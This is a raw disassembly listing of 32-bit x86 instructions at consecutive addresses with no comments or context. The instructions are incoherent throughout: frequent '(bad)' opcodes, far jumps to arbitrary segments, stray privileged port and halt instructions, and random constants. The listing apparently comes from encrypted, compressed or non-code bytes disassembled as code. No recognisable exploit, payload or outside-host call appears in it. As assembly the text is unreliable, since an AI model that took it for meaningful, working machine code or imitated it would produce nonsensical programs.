  412745:	push   esi
  412746:	mov    ch,0xa7
  412748:	xchg   ebx,eax
  412749:	mov    ah,0x70
  41274b:	jmp    0x412727
  41274d:	pop    esi
  41274e:	arpl   sp,cx
  412750:	jge    0x4127b3
  412752:	ins    BYTE PTR es:[edi],dx
  412753:	xor    al,0xa3
  412755:	cmp    eax,0x51bf060e
  41275a:	cs dec ecx
  41275c:	data16 jne 0x41278c
  41275f:	cmp    BYTE PTR [esi+0x3b],al
  412762:	mov    WORD PTR [esi],gs
  412764:	pop    eax
  412765:	jae    0x412728
  412767:	enter  0xdb79,0xfb
  41276b:	pop    eax
  41276c:	test   al,0xa7
  41276e:	in     eax,dx
  41276f:	cmc    
  412770:	jbe    0x412756
  412772:	loopne 0x4127d4
  412774:	jl     0x41272d
  412776:	fadd   DWORD PTR [ecx-0x15]
  412779:	adc    bl,bl
  41277b:	pop    ecx
  41277c:	add    BYTE PTR [edx-0x40],0x27
  412780:	lods   eax,DWORD PTR ds:[esi]
  412781:	sbb    eax,0x8f7f233d
  412786:	dec    esi
  412787:	jo     0x4127ff
  412789:	dec    edx
  41278a:	rol    BYTE PTR [esi+0x23],0xe8
  41278e:	arpl   ax,bx
  412790:	int3   
  412791:	leave  
  412792:	jl     0x412735
  412794:	sbb    dh,BYTE PTR [eax+0x5a]
  412797:	ins    DWORD PTR es:[edi],dx
  412798:	aad    0xc8
  41279a:	sbb    ebp,esp
  41279c:	sbb    cl,BYTE PTR [edx-0x50]
  41279f:	sbb    eax,0xbb12aa1b
  4127a4:	adc    esp,esp
  4127a6:	xor    ebx,esp
  4127a8:	xchg   DWORD PTR [ecx+0x6],esp
  4127ab:	shl    BYTE PTR [edi],cl
  4127ad:	xor    bl,ah
  4127af:	test   DWORD PTR [eax-0x3cae0524],esp
  4127b5:	ss jg  0x4127ef
  4127b8:	push   ebp
  4127b9:	shr    BYTE PTR [edi],1
  4127bb:	fild   WORD PTR [esp+edi*1+0x60]
  4127bf:	inc    eax
  4127c0:	mov    al,ds:0x28ca3078
  4127c5:	fidivr WORD PTR ds:0xb1d0bdad
  4127cb:	mov    ch,dl
  4127cd:	pop    eax
  4127ce:	mov    edx,0xd1aba727
  4127d3:	in     al,dx
  4127d4:	loopne 0x4127ee
  4127d6:	or     dl,BYTE PTR [ecx-0x1097e3d1]
  4127dc:	sub    eax,0x468e4057
  4127e1:	cmovl  edx,DWORD PTR [ebx]
  4127e4:	jns    0x4127c3
  4127e6:	add    edx,DWORD PTR [ecx+0x12]
  4127e9:	and    eax,0xa70cd139
  4127ee:	ss cmp al,0xc0
  4127f1:	pop    edi
  4127f2:	inc    ebp
  4127f3:	push   es
  4127f4:	mov    BYTE PTR [ecx+0x10b2593a],ch
  4127fa:	and    esi,DWORD PTR [ecx-0x31]
  4127fd:	cld    
  4127fe:	ss jae 0x4127a7
  412801:	mov    edx,0x98838297
  412806:	jmp    0xd87b:0x6d2251b3
  41280d:	mov    ebx,0xc119fa2e
  412812:	sub    al,0xa
  412814:	ret    0x9c28
  412817:	cmp    DWORD PTR [ebx-0x6d436f0a],ebx
  41281d:	xchg   ebx,eax
  41281e:	nop
  41281f:	ds das 
  412821:	jo     0x412894
  412823:	aas    
  412824:	xchg   edi,eax
  412825:	push   DWORD PTR [eax+edx*8]
  412828:	repz mov esp,eax
  41282b:	push   ds
  41282c:	in     eax,dx
  41282d:	scas   eax,DWORD PTR es:[edi]
  41282e:	fcmove st,st(7)
  412830:	and    al,BYTE PTR [ecx+0x759ba159]
  412836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412837:	fdivr  DWORD PTR [esi+0x2f]
  41283a:	jp     0x412830
  41283c:	mov    cl,BYTE PTR [esi-0x1b]
  41283f:	push   ebp
  412840:	jo     0x41285d
  412842:	(bad)  [ebp-0x69f5fdc5]
  412849:	sahf   
  41284a:	adc    al,0xd9
  41284c:	xor    al,0xce
  41284e:	call   0x3851:0xf205232a
  412855:	clc    
  412856:	cmp    al,0x9e
  412858:	sahf   
  412859:	push   cs
  41285a:	dec    edx
  41285b:	add    DWORD PTR [edx],esi
  41285d:	mov    al,0x98
  41285f:	ja     0x4128c2
  412861:	inc    eax
  412862:	mov    ecx,0x135e9136
  412867:	pop    esi
  412868:	sbb    al,0x7e
  41286a:	(bad)  
  41286b:	repnz repnz xor BYTE PTR [ebp-0x4f23a03],dl
  412873:	jmp    0xd881d3f3
  412878:	ins    DWORD PTR es:[edi],dx
  412879:	add    edi,ebx
  41287b:	jle    0x41285a
  41287d:	add    cl,BYTE PTR [ebp+0x37934718]
  412883:	(bad)  
  412885:	xchg   ebp,eax
  412886:	jle    0x412871
  412888:	dec    esp
  412889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41288a:	adc    al,0xf7
  41288c:	xor    eax,0xbf90549d
  412891:	je     0x412829
  412893:	jge    0x4128de
  412895:	call   0x5075:0x5372b138
  41289c:	data16 or cl,BYTE PTR [edx-0x2a191e4e]
  4128a3:	and    BYTE PTR [ebp+0x2092bae1],dh
  4128a9:	jp     0x4128d4
  4128ab:	mov    ecx,0xbc411266
  4128b0:	or     edx,DWORD PTR [edi+0x2d3930ac]
  4128b6:	shl    ebp,cl
  4128b8:	sbb    BYTE PTR [eax*1-0x5ca2c6fe],al
  4128bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128c0:	mov    edx,DWORD PTR [edi+0x4f9f4d83]
  4128c6:	pop    es
  4128c7:	mov    edx,0xb03bdf
  4128cc:	pop    ss
  4128cd:	leave  
  4128ce:	jbe    0x412889
  4128d0:	adc    eax,0x33c1febd
  4128d5:	inc    ebx
  4128d6:	daa    
  4128d7:	call   0x7add:0x9607ca1c
  4128de:	push   esp
  4128df:	xor    eax,0xc18e7b9f
  4128e4:	inc    edx
  4128e5:	xchg   ecx,eax
  4128e6:	inc    ebp
  4128e7:	cmp    bh,dl
  4128e9:	in     eax,0x4d
  4128eb:	ss push ebp
  4128ed:	loopne 0x412952
  4128ef:	push   esi
  4128f0:	test   al,0x9f
  4128f2:	mov    dl,0x8d
  4128f4:	daa    
  4128f5:	lock sbb DWORD PTR [ebp+0x26],0xafeb8457
  4128fd:	into   
  4128fe:	addr16 push esi
  412900:	sbb    al,ch
  412902:	test   DWORD PTR [ecx-0x17a6b088],ecx
  412908:	add    ecx,DWORD PTR [ecx+0x16]
  41290b:	mov    bh,0x9b
  41290d:	pop    ss
  41290e:	mov    eax,0x6f3f8c57
  412913:	cmp    dl,BYTE PTR [ecx]
  412915:	cmp    BYTE PTR [esi+eax*2+0x4a],dl
  412919:	jbe    0x41294f
  41291b:	je     0x412914
  41291d:	push   edx
  41291e:	inc    eax
  41291f:	push   0xd741f904
  412924:	sbb    dh,BYTE PTR [esi]
  412926:	mov    edi,0xd7c224ed
  41292b:	out    dx,al
  41292c:	xor    DWORD PTR [edi+0x5855592c],edx
  412932:	(bad)  
  412933:	iret   
  412934:	outs   dx,BYTE PTR ds:[esi]
  412935:	jmp    0x4128d2
  412937:	or     BYTE PTR [ebx],0x2d
  41293a:	bound  eax,QWORD PTR [eax]
  41293c:	adc    dh,BYTE PTR [ebx+ecx*1-0x58bb9df3]
  412943:	xchg   ebx,eax
  412944:	imul   esi
  412946:	mov    al,0x70
  412948:	clc    
  412949:	and    bh,BYTE PTR [eax+ecx*8+0x40b69366]
  412950:	retf   
  412951:	pop    esi
  412952:	mov    al,ds:0x301433d0
  412957:	(bad)  [ebp+eiz*1+0x4ca75652]
  41295e:	pop    esi
  41295f:	mov    ah,0xa2
  412961:	push   0x5d6e2bd2
  412966:	sub    al,BYTE PTR ds:0x337c43df
  41296c:	push   cx
  41296e:	out    0x3,eax
  412970:	pop    esi
  412971:	fldcw  WORD PTR [ebx-0x243a03f9]
  412978:	imul   edi,esp,0x2c
  41297b:	add    al,0xb3
  41297d:	std    
  41297e:	push   0xc15685c0
  412983:	sub    al,0x3a
  412985:	inc    esp
  412986:	add    eax,0xcd3f9f0d
  41298b:	in     eax,0x70
  41298d:	nop
  41298e:	adc    DWORD PTR [ebp+0x70],ebp
  412991:	loope  0x41298d
  412993:	mov    bh,0xf3
  412995:	xlat   BYTE PTR ds:[ebx]
  412996:	pop    ecx
  412997:	mov    ds:0xe8a9d6ec,eax
  41299c:	push   ebp
  41299d:	ss and eax,0xdc9e6ce6
  4129a3:	push   0x52
  4129a5:	leave  
  4129a6:	adc    al,bl
  4129a8:	retf   0x1478
  4129ab:	pop    esp
  4129ac:	pop    eax
  4129ad:	sahf   
  4129ae:	add    edx,DWORD PTR [edx-0x57fdc9b6]
  4129b4:	push   0xffffff94
  4129b6:	sbb    DWORD PTR [ebx],0x3c
  4129b9:	arpl   WORD PTR [edx+ecx*2+0x23c431d9],sp
  4129c0:	test   BYTE PTR [eax],ah
  4129c2:	daa    
  4129c3:	dec    esi
  4129c4:	sbb    BYTE PTR ds:0x282e3917,cl
  4129ca:	mov    ecx,0xc5dbc712
  4129cf:	cmp    DWORD PTR [edx-0x63],ecx
  4129d2:	cwde   
  4129d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d4:	aam    0xb
  4129d6:	std    
  4129d7:	adc    eax,0x49bc78b7
  4129dc:	xchg   ecx,eax
  4129dd:	xchg   edx,eax
  4129de:	and    eax,0x4c8ae525
  4129e3:	cwde   
  4129e4:	mov    bh,0x9e
  4129e6:	fwait
  4129e7:	inc    edi
  4129e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129e9:	(bad)  
  4129eb:	nop
  4129ec:	xchg   ecx,eax
  4129ed:	into   
  4129ee:	inc    edi
  4129ef:	push   ss
  4129f0:	mov    edx,0x9a6a2704
  4129f5:	adc    al,0x77
  4129f7:	sbb    eax,0xc9c37608
  4129fc:	mov    al,0xba
  4129fe:	mov    ebx,DWORD PTR [ebx+eax*4-0x79f78d64]
  412a05:	xor    DWORD PTR [esi-0x56],esp
  412a08:	fsub   DWORD PTR [ebp+ecx*4-0x5bf38818]
  412a0f:	inc    ecx
  412a10:	pop    edx
  412a11:	mov    eax,0x1aa4a3c8
  412a16:	jb     0x412a70
  412a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a19:	and    ecx,DWORD PTR [esi]
  412a1b:	fwait
  412a1c:	ss jae 0x4129e9
  412a1f:	fiadd  DWORD PTR [ecx-0x29bd07ec]
  412a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a26:	pop    edi
  412a27:	out    0x81,al
  412a29:	push   es
  412a2a:	push   ebp
  412a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a2c:	mov    ds:0x56a762aa,al
  412a31:	push   ss
  412a32:	mov    bh,0x7a
  412a34:	push   ecx
  412a35:	sub    eax,DWORD PTR [edx]
  412a37:	push   ebp
  412a38:	jle    0x412a1e
  412a3a:	sbb    cl,BYTE PTR [eax+0x71]
  412a3d:	std    
  412a3e:	sub    edi,DWORD PTR [ecx-0x5c]
  412a41:	daa    
  412a42:	cmp    al,BYTE PTR [edx-0x74]
  412a45:	aam    0xd9
  412a47:	adc    BYTE PTR ds:0x7a862a22,bl
  412a4d:	mov    cl,0x1a
  412a4f:	push   edi
  412a50:	stc    
  412a51:	cdq    
  412a52:	add    eax,0x4f28feed
  412a57:	enter  0xb630,0xd3
  412a5b:	daa    
  412a5c:	pop    eax
  412a5d:	add    DWORD PTR [edi-0x3f],ebx
  412a60:	mov    eax,ds:0xec07c776
  412a65:	sahf   
  412a66:	(bad)  
  412a67:	callw  0x57cc
  412a6b:	jns    0x412abd
  412a6d:	rcr    BYTE PTR [ecx],0xd4
  412a70:	pop    ebp
  412a71:	push   eax
  412a72:	pop    ebp
  412a73:	cwde   
  412a74:	sub    edx,ecx
  412a76:	pusha  
  412a77:	add    al,0x9e
  412a79:	std    
  412a7a:	scas   eax,DWORD PTR es:[edi]
  412a7b:	sbb    edi,ebx
  412a7d:	jne    0x412a54
  412a7f:	push   esp
  412a80:	or     esp,DWORD PTR [ecx]
  412a82:	push   ds
  412a83:	stos   BYTE PTR es:[edi],al
  412a84:	pop    ss
  412a85:	push   ss
  412a86:	sbb    BYTE PTR [ebx+0x3390e3e2],dl
  412a8c:	js     0x412aff
  412a8e:	ds (bad) 
  412a90:	sub    al,0x81
  412a92:	sbb    bl,BYTE PTR [ecx]
  412a94:	aad    0x72
  412a96:	mov    bl,0xa7
  412a98:	repz jbe 0x412a32
  412a9b:	imul   ebp,edi,0x30117186
  412aa1:	sbb    edi,0xffffff83
  412aa4:	adc    esp,DWORD PTR [eax+0x39b4a6af]
  412aaa:	in     al,dx
  412aab:	fstp   QWORD PTR [edi]
  412aad:	adc    al,0x9a
  412aaf:	popf   
  412ab0:	push   esi
  412ab1:	shl    BYTE PTR [edi],0x59
  412ab4:	push   cs
  412ab5:	shl    esi,0x70
  412ab8:	mov    cl,0x40
  412aba:	jns    0x412a7a
  412abc:	iret   
  412abd:	inc    edi
  412abe:	ror    DWORD PTR [eax+0x20],0x36
  412ac2:	pop    esi
  412ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ac4:	add    ecx,DWORD PTR ds:0x661495aa
  412aca:	xor    DWORD PTR [edx],esi
  412acc:	call   FWORD PTR ds:0xa023daf2
  412ad2:	mov    dh,BYTE PTR [ebx+0x735ce7b7]
  412ad8:	outs   dx,DWORD PTR ds:[esi]
  412ad9:	in     al,0x58
  412adb:	rol    DWORD PTR [esi],cl
  412add:	push   0x23
  412adf:	(bad)
  412ae3:	and    cl,BYTE PTR [edi]
  412ae5:	and    al,0xfd
  412ae7:	add    bh,BYTE PTR [ebx+0x6cba85d6]
  412aed:	fld    QWORD PTR [ebx]
  412aef:	jecxz  0x412a7e
  412af1:	dec    edx
  412af2:	ffree  st(3)
  412af4:	mov    eax,0xba977912
  412af9:	shr    DWORD PTR [ecx-0x74493520],cl
  412aff:	jge    0x412b72
  412b01:	xor    eax,0x188b4489
  412b06:	mov    bl,0x14
  412b08:	stc    
  412b09:	fiadd  WORD PTR [eiz*1+0x16ee7f2c]
  412b10:	enter  0x6417,0xc9
  412b14:	fild   QWORD PTR [ebp-0x7e]
  412b17:	and    ebx,ebp
  412b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b1a:	test   BYTE PTR [eax-0x32],bl
  412b1d:	(bad)  
  412b1e:	pushf  
  412b1f:	mov    esp,DWORD PTR [eax+0x5b]
  412b22:	adc    al,0x28
  412b24:	push   0xffffffee
  412b26:	loop   0x412ae2
  412b28:	or     esi,DWORD PTR [esi-0x182e11ee]
  412b2e:	ret    
  412b2f:	add    al,0x18
  412b31:	gs xchg ebp,eax
  412b33:	cld    
  412b34:	popa   
  412b35:	pop    edx
  412b36:	sbb    esi,DWORD PTR [eax*1+0x619ed2c]
  412b3d:	pop    edi
  412b3e:	repnz or eax,0xa9dc5705
  412b44:	fld    TBYTE PTR [edx+0x4f]
  412b47:	xchg   DWORD PTR [ecx],ebp
  412b49:	fmul   QWORD PTR [ebx-0x67]
  412b4c:	push   es
  412b4d:	pop    edi
  412b4e:	adc    bh,0x49
  412b51:	mov    dl,0xb4
  412b53:	sbb    DWORD PTR [ecx-0x7fd67609],eax
  412b59:	inc    esi
  412b5a:	and    ebx,esp
  412b5c:	ss and cl,ch
  412b5f:	jns    0x412b4f
  412b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b62:	xchg   ebp,eax
  412b63:	xchg   ecx,eax
  412b64:	lods   eax,DWORD PTR ds:[esi]
  412b65:	out    0xe8,al
  412b67:	pop    esp
  412b68:	sub    DWORD PTR [ecx+0x6352bbd8],esp
  412b6e:	mov    cl,0x25
  412b70:	jbe    0x412bb3
  412b72:	sub    ebx,DWORD PTR [ecx+ebp*4+0x55]
  412b76:	cmp    eax,0xcd3c7a2b
  412b7b:	daa    
  412b7c:	call   0xb328fdbc
  412b81:	jle    0x412bfd
  412b83:	push   edi
  412b84:	jbe    0x412bec
  412b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b87:	push   ds
  412b88:	push   ebp
  412b89:	mov    al,ds:0xcc04eaf5
  412b8e:	arpl   WORD PTR [esi],bx
  412b90:	add    al,0xdc
  412b92:	xor    edx,DWORD PTR [edi-0x4]
  412b95:	adc    DWORD PTR [edi],0x106204bf
  412b9b:	(bad)  
  412b9c:	xlat   BYTE PTR ds:[ebx]
  412b9d:	ja     0x412bdd
  412b9f:	jp     0x412b9d
  412ba1:	in     eax,dx
  412ba2:	out    dx,eax
  412ba3:	sbb    al,0x1e
  412ba5:	loope  0x412b30
  412ba7:	dec    ebp
  412ba8:	xor    DWORD PTR ss:[edx-0x11e7f16e],esp
  412baf:	lea    ebx,[esi+0x1e61bf0b]
  412bb5:	push   ds
  412bb6:	loopne 0x412b4a
  412bb8:	adc    ebx,DWORD PTR [esi+esi*2]
  412bbb:	pushf  
  412bbc:	stos   DWORD PTR es:[edi],eax
  412bbd:	adc    BYTE PTR [ebp+edx*1+0x46f3ee00],dl
  412bc4:	sbb    DWORD PTR [ecx-0x37114ab1],edi
  412bca:	dec    ebx
  412bcb:	dec    esi
  412bcc:	imul   edx,DWORD PTR [ebp+eax*1+0xb],0x6c5100c0
  412bd4:	mov    edi,0xaeb24d50
  412bd9:	xchg   DWORD PTR [eax-0x46],eax
  412bdc:	(bad)  
  412bdd:	stc    
  412bde:	mov    cl,0x9a
  412be0:	les    edi,FWORD PTR [edi+0x1b]
  412be3:	mov    dl,0x1e
  412be5:	cmp    eax,0x76477ba3
  412bea:	dec    ebp
  412beb:	sbb    ebp,DWORD PTR [edi+eax*1-0x3b]
  412bef:	popf   
  412bf0:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf2:	mov    eax,0xf402c8d
  412bf7:	sbb    dl,BYTE PTR [bp+di]
  412bfa:	add    BYTE PTR [eax+0x58],dl
  412bfd:	lea    ebp,[eax-0x2e4b004a]
  412c03:	je     0x412be1
  412c05:	add    BYTE PTR [edx],0xbc
  412c08:	xlat   BYTE PTR ds:[ebx]
  412c09:	xor    DWORD PTR [ecx],ecx
  412c0b:	dec    eax
  412c0c:	push   ss
  412c0d:	push   0xffffff91
  412c0f:	outs   dx,BYTE PTR ds:[esi]
  412c10:	(bad)  
  412c11:	jecxz  0x412c84
  412c13:	mov    esp,0x99ef0c95
  412c18:	cmp    ebx,esi
  412c1a:	popa   
  412c1b:	lds    esi,FWORD PTR [esi+0x52]
  412c1e:	cmp    al,0x24
  412c20:	mov    dl,0x33
  412c22:	sbb    dl,bh
  412c24:	and    al,0x1a
  412c26:	mov    BYTE PTR [eax],ah
  412c28:	mov    eax,ds:0x90dbe906
  412c2d:	sub    bh,BYTE PTR [edx+0x5c6576ca]
  412c33:	std    
  412c34:	lahf   
  412c35:	sub    eax,0x588f34e8
  412c3a:	xchg   ecx,eax
  412c3b:	mov    edi,0x7cb542fc
  412c40:	pop    eax
  412c41:	jmp    0x6d41382
  412c46:	ret    0xfd30
  412c49:	js     0x412c42
  412c4b:	pop    ds
  412c4c:	int3   
  412c4d:	push   ds
  412c4e:	fdiv   DWORD PTR [ecx]
  412c50:	mov    esi,DWORD PTR [ebp-0x1]
  412c53:	cmp    BYTE PTR [esi],dh
  412c55:	jae    0x412ca7
  412c57:	mov    cl,0x8b
  412c59:	stos   DWORD PTR es:[edi],eax
  412c5a:	sub    dh,cl
  412c5c:	loopne 0x412bea
  412c5e:	(bad)  
  412c5f:	pop    ds
  412c60:	fs fld st(5)
  412c63:	add    BYTE PTR [esi+0x4a],dl
  412c66:	ror    DWORD PTR [edx-0x712ae8e8],cl
  412c6c:	inc    esp
  412c6d:	or     DWORD PTR [ebx],eax
  412c6f:	jno    0x412c14
  412c71:	test   DWORD PTR [ecx+0x43],0x9114f871
  412c78:	(bad)  
  412c79:	adc    bl,BYTE PTR [ecx]
  412c7b:	xor    ch,BYTE PTR [ebx+0x191b9705]
  412c81:	test   dl,dh
  412c83:	xchg   edi,eax
  412c84:	lods   al,BYTE PTR ds:[esi]
  412c85:	fwait
  412c86:	mov    ch,0x2d
  412c88:	dec    esi
  412c89:	imul   esp,esp,0x526ccec1
  412c8f:	cmp    eax,0xd9c111d7
  412c94:	push   ds
  412c95:	fcmovnb st,st(1)
  412c97:	pop    ds
  412c98:	scas   al,BYTE PTR es:[edi]
  412c99:	nop
  412c9a:	or     edi,DWORD PTR [edx-0x7e1193e4]
  412ca0:	inc    ecx
  412ca1:	in     eax,0xd8
  412ca3:	and    al,0xed
  412ca5:	cmp    eax,0xfed8881a
  412caa:	mov    ds:0x80fba896,al
  412caf:	ror    al,1
  412cb1:	or     DWORD PTR [ecx-0x4983f234],esi
  412cb7:	jns    0x412cdc
  412cb9:	mov    al,ds:0x3800e334
  412cbe:	test   esp,ecx
  412cc0:	mov    ah,0xf
  412cc2:	xor    al,0xa
  412cc4:	pop    esp
  412cc5:	cli    
  412cc6:	hlt    
  412cc7:	les    ebp,FWORD PTR [edx+ebp*1+0x28d5afe7]
  412cce:	push   ecx
  412ccf:	pop    esp
  412cd0:	call   0xa8913c55
  412cd5:	mov    dl,0xd4
  412cd7:	mov    dl,0xe5
  412cd9:	lea    esi,[ecx-0x2b941ca4]
  412cdf:	pop    esi
  412ce0:	int3   
  412ce1:	arpl   dx,bp
  412ce3:	adc    DWORD PTR [ecx+0x293a0b13],esp
  412ce9:	cdq    
  412cea:	fsub   QWORD PTR [edx+esi*8]
  412ced:	lods   eax,DWORD PTR ds:[esi]
  412cee:	lods   al,BYTE PTR ds:[esi]
  412cef:	and    DWORD PTR [edx-0xa909071],eax
  412cf5:	pop    ecx
  412cf6:	cli    
  412cf7:	je     0x412d3a
  412cf9:	cmp    al,0x48
  412cfb:	sub    al,0xba
  412cfd:	call   0xdaf3:0x9a56e209
  412d04:	aas    
  412d05:	iret   
  412d06:	psllw  mm1,mm0
  412d09:	xchg   esp,eax
  412d0a:	inc    esp
  412d0b:	std    
  412d0c:	dec    ebx
  412d0d:	dec    ebx
  412d0e:	jecxz  0x412ce4
  412d10:	xor    BYTE PTR [ecx+0x5e],al
  412d13:	xchg   esi,eax
  412d14:	inc    esp
  412d15:	mov    ecx,0x8b5a8374
  412d1a:	sbb    al,0x18
  412d1c:	push   edi
  412d1d:	adc    BYTE PTR [ebx-0x78],ch
  412d20:	in     al,0x44
  412d22:	jp     0x412d9f
  412d24:	popa   
  412d25:	std    
  412d26:	arpl   WORD PTR [edi+0x35],bx
  412d29:	popf   
  412d2a:	daa    
  412d2b:	ret    0xccde
  412d2e:	add    eax,0xf2b9b478
  412d33:	aaa    
  412d34:	adc    BYTE PTR ds:0x7bb29bcd,ch
  412d3a:	or     ah,BYTE PTR [ebp-0x63813264]
  412d40:	mov    edx,esi
  412d42:	dec    esp
  412d43:	adc    BYTE PTR [esi+0x7c],dh
  412d46:	clc    
  412d47:	push   edx
  412d48:	fdiv   st(6),st
  412d4a:	jp     0x412db9
  412d4c:	mul    BYTE PTR [ebx-0x1dc48968]
  412d52:	fst    DWORD PTR [eax]
  412d54:	test   eax,0xf803fd19
  412d59:	lock fisttp QWORD PTR [esi+0x7a]
  412d5d:	jmp    0x412d79
  412d5f:	(bad)  
  412d61:	jge    0x412d51
  412d63:	mov    eax,ds:0xa74aede9
  412d68:	add    bh,BYTE PTR [ecx+ecx*1+0xce06fe9]
  412d6f:	lea    ebp,[edx]
  412d71:	(bad)  
  412d73:	xlat   BYTE PTR ds:[ebx]
  412d74:	lahf   
  412d75:	push   cs
  412d76:	jmp    0x412dac
  412d78:	fsub   QWORD PTR [ebx-0x79]
  412d7b:	test   eax,0xb2bf6c4b
  412d80:	mov    ebp,edx
  412d82:	push   es
  412d83:	push   esi
  412d84:	cwde   
  412d85:	push   edx
  412d86:	and    dl,BYTE PTR [ecx+0x3a]
  412d89:	sbb    BYTE PTR [ebp-0x1413fa],dl
  412d8f:	mov    ecx,0x625bf01d
  412d94:	sbb    DWORD PTR [edi+0x11],esp
  412d97:	jmp    0x858b:0xf85cdec7
  412d9e:	dec    ecx
  412d9f:	(bad)  
  412da0:	mov    eax,ds:0x9ec0248b
  412da5:	mov    ebp,0xf56ccfd1
  412daa:	stos   DWORD PTR es:[edi],eax
  412dab:	test   al,0x9e
  412dad:	mov    ds:0x4342d310,al
  412db2:	out    dx,al
  412db3:	inc    esi
  412db4:	pushf  
  412db5:	mov    cl,0x60
  412db7:	aad    0x3
  412db9:	fisubr WORD PTR [eax+0x21]
  412dbc:	inc    esi
  412dbd:	fs call 0x448f:0x15792cc7
  412dc5:	test   al,0x32
  412dc7:	cmp    eax,0x6d842f38
  412dcc:	into   
  412dcd:	cmp    DWORD PTR [ecx],0x91c364e5
  412dd3:	push   eax
  412dd4:	pop    esi
  412dd5:	ret    0xfbda
  412dd8:	outs   dx,DWORD PTR ds:[esi]
  412dd9:	or     eax,0x7e8bc55e
  412dde:	test   al,0x3d
  412de0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412de2:	aaa    
  412de3:	sbb    al,0xe3
  412de5:	(bad)  
  412de6:	push   ds
  412de7:	inc    edx
  412de8:	mov    ss,esi
  412dea:	xor    DWORD PTR [ebp-0x3],esi
  412ded:	or     BYTE PTR [ecx-0x6d],dl
  412df0:	js     0x412dc2
  412df2:	xchg   ebx,eax
  412df3:	pop    ss
  412df4:	jecxz  0x412da2
  412df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df7:	push   esi
  412df8:	mov    WORD PTR [edi+0x42],fs
  412dfb:	leave  
  412dfc:	sbb    edi,ebx
  412dfe:	pop    eax
  412dff:	hlt    
  412e00:	mov    ds:0xe193a002,al
  412e05:	add    dh,BYTE PTR [bp+di]
  412e08:	xor    bx,WORD PTR [edx]
  412e0b:	pop    edx
  412e0c:	dec    ecx
  412e0d:	pushf  
  412e0e:	xchg   esi,eax
  412e0f:	sub    al,bh
  412e11:	fcom   QWORD PTR [edx]
  412e13:	in     eax,0x2f
  412e15:	enter  0x3a0,0xeb
  412e19:	mov    dh,0x12
  412e1b:	aam    0xc7
  412e1d:	cmc    
  412e1e:	or     bh,BYTE PTR [eax-0x1ba75271]
  412e24:	xlat   BYTE PTR ds:[ebx]
  412e25:	in     al,dx
  412e26:	sbb    eax,DWORD PTR [ebp+0x2e47908b]
  412e2c:	fstp   QWORD PTR [edi]
  412e2e:	pop    eax
  412e2f:	call   0x1f4f2320
  412e34:	repnz dec ebp
  412e36:	sbb    bh,BYTE PTR [esi]
  412e38:	mov    DWORD PTR [ebp+0x4d],edi
  412e3b:	mov    dh,0x6b
  412e3d:	pop    esp
  412e3e:	add    edx,0x20
  412e41:	push   edi
  412e42:	outs   dx,DWORD PTR ds:[esi]
  412e43:	imul   esi,DWORD PTR [ecx],0x11e2efa4
  412e49:	outs   dx,BYTE PTR ds:[esi]
  412e4a:	mov    ah,0xf6
  412e4c:	jae    0x412e2e
  412e4e:	int3   
  412e4f:	ins    DWORD PTR es:[edi],dx
  412e50:	idiv   BYTE PTR [edi]
  412e52:	arpl   sp,cx
  412e54:	xor    DWORD PTR [esi-0x12bd3763],edi
  412e5a:	sub    eax,0x5903d99f
  412e5f:	xlat   BYTE PTR ds:[ebx]
  412e60:	xchg   DWORD PTR [ebx],esi
  412e62:	sbb    al,0xb8
  412e64:	mov    ds:0x8146c90b,al
  412e69:	xchg   ecx,eax
  412e6a:	jge    0x412e56
  412e6c:	(bad)  
  412e6d:	idiv   edi
  412e6f:	dec    edi
  412e70:	std    
  412e71:	add    bl,BYTE PTR [ebx-0x3b0ab04e]
  412e77:	cmp    eax,0x26a2ea0e
  412e7c:	or     edi,edx
  412e7e:	in     eax,dx
  412e7f:	shl    DWORD PTR [eax],1
  412e81:	shl    DWORD PTR [esp+edx*4],cl
  412e84:	hlt    
  412e85:	dec    ebx
  412e86:	push   0xffffffcd
  412e88:	int3   
  412e89:	xchg   esp,eax
  412e8a:	push   esp
  412e8b:	inc    ecx
  412e8c:	jmp    0x412ea0
  412e8e:	sbb    al,BYTE PTR [esi]
  412e90:	fistp  DWORD PTR [di]
  412e93:	gs out dx,eax
  412e95:	ins    DWORD PTR es:[edi],dx
  412e96:	sbb    eax,0x9d1a28
  412e9b:	mov    ebp,0xf2d4f90f
  412ea0:	inc    eax
  412ea1:	jle    0x412e54
  412ea3:	inc    ecx
  412ea4:	or     eax,0x2cfa8af3
  412ea9:	mov    ds:0x53daff51,eax
  412eae:	test   eax,0x53b85dc1
  412eb3:	les    ebx,FWORD PTR [ecx-0x4a]
  412eb6:	ss ins DWORD PTR es:[edi],dx
  412eb8:	(bad)  
  412eb9:	mov    esi,0x7b428f63
  412ebe:	addr16 mov ecx,0xae4f312e
  412ec4:	xor    BYTE PTR [edx-0x3c],ah
  412ec7:	fwait
  412ec8:	test   BYTE PTR [ebx],bh
  412eca:	mov    bh,ah
  412ecc:	(bad)  
  412ecd:	fistp  WORD PTR [ecx]
  412ecf:	std    
  412ed0:	and    al,0xbc
  412ed2:	dec    esi
  412ed3:	div    DWORD PTR [edi+0x1e]
  412ed6:	push   edx
  412ed7:	jae    0x412ee0
  412ed9:	and    eax,0x540f656b
  412ede:	ficom  WORD PTR [ecx+0x247d4848]
  412ee4:	lds    ebp,FWORD PTR [ecx-0x45]
  412ee7:	pushf  
  412ee8:	add    DWORD PTR ds:[edi+0x4d895795],eax
  412eef:	mov    ebx,0xf26d2239
  412ef4:	add    edi,esp
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	fmul   DWORD PTR [edx+0x3b]
  412efa:	adc    ebx,eax
  412efc:	xchg   esp,eax
  412efd:	lock stc 
  412eff:	out    0x79,eax
  412f01:	or     dl,dh
